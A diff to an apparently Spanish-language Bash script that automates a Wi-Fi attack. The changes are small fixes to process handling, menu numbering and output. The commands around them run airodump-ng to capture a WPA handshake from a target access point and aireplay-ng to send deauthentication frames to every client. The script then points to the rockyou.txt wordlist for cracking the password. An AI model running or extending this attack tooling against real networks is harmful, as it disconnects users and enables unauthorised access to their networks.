@@ -80,7 +80,7 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								wait $airodump_xterm_PID 2>/dev/null
 
 								xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
-								airodump_filter_xterm_PID=$?
+								airodump_filter_xterm_PID=$!
 
 								sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
 								aireplay_xterm_PID=$!
@@ -89,7 +89,8 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								echo -e "${redColour}\n[%] Esperando Handshake\n"
 								$cleancolor
 								
-								sleep 10
+								sleep 10; kill -9 $airodump_filter_xterm_PID
+								wait $airodump_filter_xterm_PID 2>/dev/null
 								test -f Handshake-01.cap
 								if [ "$(echo $?)" == "0" ]; then
 									echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
@@ -102,7 +103,7 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 									sudo /etc/init.d/networking start > /dev/null 2>&1
 									sudo /etc/init.d/networking restart > /dev/null 2>&1
 									ifconfig $tar up > /dev/null 2>&1
-									sudo rm Handshake*
+									sudo rm Handshake* > /dev/null 2>&1
 									exit
 								else 
 									echo -e "${redColour}\n [!] No se ha capturado el Handshake"
@@ -111,13 +112,13 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								2)
 								echo "Prueba"
 								;;
-								4)
+								3)
 								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
 								airmon-ng stop ${tar}mon > /dev/null 2>&1
 								sudo /etc/init.d/networking start > /dev/null 2>&1
 								sudo /etc/init.d/networking restart > /dev/null 2>&1
 								ifconfig $tar up > /dev/null 2>&1
-								sudo rm Handshake*
+								sudo rm Handshake* > /dev/null 2>&1
 								exit
 								;;
 								*)
